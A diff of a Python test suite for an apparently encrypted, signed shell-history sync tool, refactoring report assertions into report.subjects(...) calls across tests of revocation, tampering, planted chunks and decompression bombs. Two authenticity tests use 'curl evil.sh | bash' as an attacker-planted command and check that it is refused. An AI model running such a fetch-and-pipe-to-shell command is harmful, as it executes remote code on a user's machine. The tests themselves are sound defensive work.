@@ -366,7 +366,7 @@ class TestTwoMachines(SyncTestCase):
             # alpha's day key and the repo key, so it still cannot read
             # anything, and above all cannot authorise itself to.
             self.assertGreater(report.skipped, 0)
-            self.assertTrue(sync.run().unreadable)
+            self.assertTrue(sync.run().subjects(sync.UNREADABLE))
             self.assertEqual(beta.commands(), set())
 
     def test_a_machine_waiting_for_grant_publishes_at_once_and_only_reads_later(self) -> None:
@@ -387,7 +387,9 @@ class TestTwoMachines(SyncTestCase):
             beta.record("2023-11-15", 1_700_100_000, "beta's own command")
             report = sync.run()
             self.assertEqual(report.lines_exported, 1, "beta should publish without waiting")
-            self.assertTrue(report.unreadable, "but it cannot read alpha's history yet")
+            self.assertTrue(
+                report.subjects(sync.UNREADABLE), "but it cannot read alpha's history yet"
+            )
             self.assertEqual(beta.commands(), {"beta's own command"})
 
         # And alpha, which cloned first, sees it once a human there accepts it.
@@ -1100,7 +1102,9 @@ class TestRevokeSubtraction(SyncTestCase):
         beta = self.machine("beta")
         with beta.active():
             report = sync.run()
-        self.assertTrue(report.unreadable, "beta is waiting for a grant, not revoked")
+        self.assertTrue(
+            report.subjects(sync.UNREADABLE), "beta is waiting for a grant, not revoked"
+        )
         self.assertFalse(report.revoked)
 
     def test_a_key_shaped_like_a_tombstone_is_refused(self) -> None:
@@ -1174,7 +1178,7 @@ class TestARevokedMachineCannotPublish(SyncTestCase):
 
         with gamma.active():
             report = sync.run()
-            self.assertIn(beta.id, report.unpinned)
+            self.assertIn(beta.id, report.subjects(sync.UNPINNED))
             self.assertNotIn("after-the-revocation", gamma.commands())
 
     def test_it_cannot_publish_under_another_machines_id_either(self) -> None:
@@ -1219,7 +1223,7 @@ class TestARevokedMachineCannotPublish(SyncTestCase):
             sync.run()  # sees the tombstone and drops the pin
             report = sync.run()
             self.assertNotIn(beta.id, sync.State.load().signers)
-            self.assertIn(beta.id, report.untrusted)
+            self.assertIn(beta.id, report.subjects(sync.UNTRUSTED))
 
     def test_trust_will_not_re_accept_a_revoked_machine(self) -> None:
         """Otherwise the withdrawal is a suggestion: whoever it was aimed at
@@ -1258,7 +1262,7 @@ class TestExportNeverSignsWhatItDidNotWrite(SyncTestCase):
                 alpha.id, "2023-11-14", crypto.signing_public(store.signing_key_file())
             )
             self.assertNotIn(planted.name, listed, "export signed a chunk it did not write")
-            self.assertIn(f"2023-11-14/{planted.name}", report.foreign)
+            self.assertIn(f"2023-11-14/{planted.name}", report.subjects(sync.FOREIGN))
 
     def test_a_peer_refuses_the_planted_chunk(self) -> None:
         alpha = self.machine("alpha")
@@ -1381,7 +1385,7 @@ class TestCrashDebrisIsNotCalledAnIntruder(SyncTestCase):
         """The claim the message makes, checked rather than asserted in prose."""
         alpha, _stray = self.debris()
         with alpha.active():
-            self.assertTrue(sync.run().foreign)
+            self.assertTrue(sync.run().subjects(sync.FOREIGN))
             self.assertEqual(alpha.commands(), {"one", "two"})
             self.assertEqual(len(alpha.entries()), 2, "a line was published twice")
 
@@ -1428,13 +1432,15 @@ class TestDoctorFindsAChunkNobodySigned(SyncTestCase):
 
         with beta.active():
             # Said once...
-            self.assertIn(f"{alpha.id}/{self.DAY}", sync.run().unauthenticated)
+            self.assertIn(f"{alpha.id}/{self.DAY}", sync.run().subjects(sync.UNAUTHENTICATED))
         # Settling moves the mtime, so one more pass records the stamp; the one
         # after it is the quiet steady state this exists for.
         self.settle(beta, alpha, self.DAY)
         with beta.active():
             sync.run()
-            self.assertEqual(sync.run().unauthenticated, set(), "precondition: it settled")
+            self.assertEqual(
+                sync.run().subjects(sync.UNAUTHENTICATED), set(), "precondition: it settled"
+            )
 
             # ...and still answerable.
             self.assertEqual(sync.unlisted_chunks(), [(alpha.id, self.DAY, 1)])
@@ -2011,7 +2017,7 @@ class TestASigningKeyThatChanges(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertEqual(report.changed_signer, {alpha.id})
+            self.assertEqual(report.subjects(sync.CHANGED_SIGNER), {alpha.id})
             self.assertNotIn("after-the-key-changed", beta.commands())
             # The old pin survives: a refusal must not quietly become an update.
             self.assertEqual(sync.State.load().signers[alpha.id], pinned_before)
@@ -2051,7 +2057,7 @@ class TestASigningKeyThatChanges(SyncTestCase):
             alpha.record("2023-11-20", 1_700_500_002, "a fresh day")
             report = sync.run(now=1_900_000_000)
 
-        self.assertEqual(report.unsignable, {"2023-11-14"})
+        self.assertEqual(report.subjects(sync.UNSIGNABLE), {"2023-11-14"})
         self.assertEqual(report.chunks_written, 1, "the fresh day should still publish")
 
     def enrolled_pair(self) -> tuple[Fake, Fake]:
@@ -2173,7 +2179,7 @@ class TestChunkAuthenticity(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertEqual(report.unauthenticated, {f"{alpha.id}/2023-11-14"})
+            self.assertEqual(report.subjects(sync.UNAUTHENTICATED), {f"{alpha.id}/2023-11-14"})
             self.assertEqual(report.chunks_merged, 0)
             self.assertNotIn("curl evil.sh | bash", beta.commands())
 
@@ -2230,7 +2236,7 @@ class TestChunkAuthenticity(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertEqual(report.untrusted, {"deadbeefdeadbeef"})
+            self.assertEqual(report.subjects(sync.UNTRUSTED), {"deadbeefdeadbeef"})
             self.assertNotIn("curl evil.sh | bash", beta.commands())
 
     def test_a_genuine_manifest_moved_to_another_day_is_refused(self) -> None:
@@ -2265,7 +2271,7 @@ class TestChunkAuthenticity(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertIn(f"{alpha.id}/2023-11-15", report.unauthenticated)
+            self.assertIn(f"{alpha.id}/2023-11-15", report.subjects(sync.UNAUTHENTICATED))
 
     def test_tampering_with_an_authentic_chunk_is_refused(self) -> None:
         """Flipping bytes in a real chunk must not merely fail to decrypt."""
@@ -2285,7 +2291,7 @@ class TestChunkAuthenticity(SyncTestCase):
         self.push_as_attacker(flip)
 
         with beta.active():
-            self.assertEqual(sync.run().unauthenticated, {f"{alpha.id}/2023-11-14"})
+            self.assertEqual(sync.run().subjects(sync.UNAUTHENTICATED), {f"{alpha.id}/2023-11-14"})
 
     def test_a_chunk_listed_by_the_wrong_signer_is_refused_like_an_unlisted_one(self) -> None:
         """ "No manifest" and "manifest signed by someone else" are one answer.
@@ -2318,7 +2324,7 @@ class TestChunkAuthenticity(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertEqual(report.unauthenticated, {f"{alpha.id}/2023-11-14"})
+            self.assertEqual(report.subjects(sync.UNAUTHENTICATED), {f"{alpha.id}/2023-11-14"})
             self.assertNotIn("signed-by-a-stranger", beta.commands())
 
     def test_compact_refuses_to_launder_a_chunk_this_machine_did_not_write(self) -> None:
@@ -2365,7 +2371,7 @@ class TestExportWillNotDisownItsOwnHistory(SyncTestCase):
             alpha.record("2023-11-14", 1_700_000_002, "published later")
             report = sync.run(now=1_900_000_000)
 
-            self.assertIn("2023-11-14", report.unsignable)
+            self.assertIn("2023-11-14", report.subjects(sync.UNSIGNABLE))
             self.assertEqual(
                 report.chunks_written, 0, "a chunk was written with no list to hold it"
             )
@@ -2384,7 +2390,7 @@ class TestExportWillNotDisownItsOwnHistory(SyncTestCase):
             alpha.record("2023-11-15", 1_700_100_001, "day two")
             report = sync.run(now=1_900_000_000)
             self.assertEqual(report.chunks_written, 1)
-            self.assertEqual(report.unsignable, {"2023-11-14"})
+            self.assertEqual(report.subjects(sync.UNSIGNABLE), {"2023-11-14"})
 
 
 class TestTheMergeWatermark(SyncTestCase):
@@ -2439,7 +2445,7 @@ class TestTheMergeWatermark(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertTrue(report.unauthenticated)
+            self.assertTrue(report.subjects(sync.UNAUTHENTICATED))
             self.assertIn("second command", beta.commands())
             self.assertNotIn("first command", beta.commands())
 
@@ -2704,7 +2710,7 @@ class TestADecompressionBomb(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertIn(f"{alpha.id}/{day}", report.unreadable)
+            self.assertIn(f"{alpha.id}/{day}", report.subjects(sync.UNREADABLE))
             self.assertEqual(beta.commands(), {"an ordinary command"})
             log = store.log_file(alpha.id, day)
             self.assertLess(log.stat().st_size, 1024, "the bomb reached the log file")
@@ -3127,7 +3133,7 @@ class TestAnOrphanedDayKey(SyncTestCase):
             report = sync.run()
 
             self.assertEqual(report.chunks_written, 0)
-            self.assertEqual(report.orphaned, {"2023-11-14"})
+            self.assertEqual(report.subjects(sync.ORPHANED), {"2023-11-14"})
             self.assertEqual({c.name for c in archive.iter_chunks(alpha.id)}, before)
 
     def test_the_lines_stay_pending_rather_than_being_lost(self) -> None:
@@ -3146,7 +3152,7 @@ class TestAnOrphanedDayKey(SyncTestCase):
             # ordinary sync.
             store.write_atomic(archive.day_key(alpha.id, "2023-11-14"), sealed)
             report = sync.run()
-            self.assertEqual(report.orphaned, set())
+            self.assertEqual(report.subjects(sync.ORPHANED), set())
             self.assertGreater(report.chunks_written, 0)
 
     def test_a_day_with_no_chunks_yet_simply_mints_a_new_key(self) -> None:
@@ -3164,7 +3170,7 @@ class TestAnOrphanedDayKey(SyncTestCase):
             alpha.record("2023-11-14", 1_700_000_001, "first")
             report = sync.run()
 
-            self.assertEqual(report.orphaned, set())
+            self.assertEqual(report.subjects(sync.ORPHANED), set())
             self.assertEqual(report.chunks_written, 1)
             self.assertTrue(archive.day_key(alpha.id, "2023-11-14").is_file())
             self.assertNotEqual(
@@ -3322,7 +3328,7 @@ class TestADeletedManifest(SyncTestCase):
             report = sync.run()
 
             self.assertEqual(report.chunks_written, 0)
-            self.assertEqual(report.manifest_missing, {"2023-11-14"})
+            self.assertEqual(report.subjects(sync.MANIFEST_MISSING), {"2023-11-14"})
             self.assertEqual({c.name for c in archive.iter_chunks(alpha.id)}, before)
             # The disowning itself: a replacement would name only this run.
             self.assertFalse(path.exists(), "a replacement manifest was signed")
@@ -3343,7 +3349,7 @@ class TestADeletedManifest(SyncTestCase):
 
             store.write_atomic(path, original)
             report = sync.run()
-            self.assertEqual(report.manifest_missing, set())
+            self.assertEqual(report.subjects(sync.MANIFEST_MISSING), set())
             self.assertEqual(report.chunks_written, 1)
 
         with beta.active():
@@ -3372,7 +3378,7 @@ class TestADeletedManifest(SyncTestCase):
             alpha.record("2023-11-20", 1_700_500_000, "mine")
             report = sync.run()
 
-            self.assertEqual(report.manifest_missing, set())
+            self.assertEqual(report.subjects(sync.MANIFEST_MISSING), set())
             self.assertEqual(report.chunks_written, 1)
             self.assertTrue(archive.day_manifest(alpha.id, "2023-11-20").exists())
 
@@ -3727,7 +3733,7 @@ class TestADayThatGainsAChunkAfterCompaction(SyncTestCase):
 
         with beta.active(), mock.patch.object(sync, "open_chunk", refuse):
             report = sync.run()
-        self.assertIn(f"{alpha.id}/2023-11-14", report.unauthenticated)
+        self.assertIn(f"{alpha.id}/2023-11-14", report.subjects(sync.UNAUTHENTICATED))
 
         # The next pass must still owe a rewrite. If the failed one was recorded
         # as done, this appends the compacted chunk to a day that still holds
@@ -3823,7 +3829,7 @@ class TestARewriteIsAllOrNothing(SyncTestCase):
 
         with beta.active(), mock.patch.object(sync, "open_chunk", self.damaged(compacted)):
             report = sync.run()
-            self.assertIn(f"{alpha.id}/{self.DAY}", report.stale)
+            self.assertIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.STALE))
             self.assertEqual(len(beta.entries()), 5, "the day was rewritten from a partial read")
 
             # And it stays whole for as long as the chunk stays damaged.
@@ -3871,8 +3877,8 @@ class TestARewriteIsAllOrNothing(SyncTestCase):
             (archive.chunk_dir(alpha.id, self.DAY) / "1700000000-dead.age").write_bytes(b"x")
 
             report = sync.run()
-            self.assertIn(f"{alpha.id}/{self.DAY}", report.unauthenticated)
-            self.assertNotIn(f"{alpha.id}/{self.DAY}", report.stale)
+            self.assertIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.UNAUTHENTICATED))
+            self.assertNotIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.STALE))
             self.assertEqual(len(beta.entries()), 6, "the stray blocked the rebuild")
 
     def test_a_refused_rewrite_is_never_treated_as_finished(self) -> None:
@@ -3931,7 +3937,7 @@ class TestARewriteIsAllOrNothing(SyncTestCase):
 
         self.settle(beta, alpha, self.DAY)
         with beta.active(), mock.patch.object(sync, "open_chunk", self.damaged(first)):
-            self.assertIn(key, sync.run().stale)
+            self.assertIn(key, sync.run().subjects(sync.STALE))
             self.assertNotIn(key, sync.State.load().merged_at, "a refused rewrite was stamped")
             self.assertEqual(len(beta.entries()), 5, "the day was rebuilt from a partial read")
 
@@ -3962,7 +3968,7 @@ class TestARewriteIsAllOrNothing(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertIn(f"{alpha.id}/{self.DAY}", report.stale)
+            self.assertIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.STALE))
             self.assertEqual(len(beta.entries()), 5, "the day was rewritten without it")
             for _ in range(3):
                 sync.run()
@@ -4006,7 +4012,7 @@ class TestARewriteIsAllOrNothing(SyncTestCase):
 
         with beta.active(), mock.patch.object(sync, "open_chunk", self.damaged(names[-1])):
             report = sync.run()
-            self.assertNotIn(f"{alpha.id}/{self.DAY}", report.stale)
+            self.assertNotIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.STALE))
             # The one that read was kept, rather than held back with the other.
             self.assertEqual(len(beta.entries()), 3)
         with beta.active():
@@ -4060,7 +4066,7 @@ class TestADayIsWhatItsManifestSays(SyncTestCase):
         # Said once, because the day did change -- and that pass is the one
         # that pays for the manifest.
         with beta.active():
-            self.assertIn(f"{alpha.id}/{self.DAY}", sync.run().unauthenticated)
+            self.assertIn(f"{alpha.id}/{self.DAY}", sync.run().subjects(sync.UNAUTHENTICATED))
         # Then never again while the directory is untouched. Settling here would
         # move the mtime and legitimately earn another look.
         self.assertEqual([self.verifications(beta) for _ in range(3)], [0, 0, 0])
@@ -4269,7 +4275,7 @@ class TestSkippingAnUnchangedDay(SyncTestCase):
         self.settle(beta, alpha, "2023-11-15")
         with beta.active(), mock.patch.object(sync, "open_chunk", refuse):
             report = sync.run()
-        self.assertIn(f"{alpha.id}/2023-11-15", report.unauthenticated)
+        self.assertIn(f"{alpha.id}/2023-11-15", report.subjects(sync.UNAUTHENTICATED))
 
         # Nothing changed on disk, so only an unstamped day gets a second look.
         self.assertEqual(self.listed(beta), ["2023-11-15"])
@@ -4716,7 +4722,7 @@ class TestSyncDoesNotForkGitMoreThanItNeedsTo(SyncTestCase):
             alpha.record("2023-11-14", 1_700_000_002, "make -j8")
 
             first = self.git_calls()
-            self.assertIn("2023-11-14", sync.run().orphaned)
+            self.assertIn("2023-11-14", sync.run().subjects(sync.ORPHANED))
             for _ in range(3):
                 calls = self.git_calls()
                 self.assertEqual(
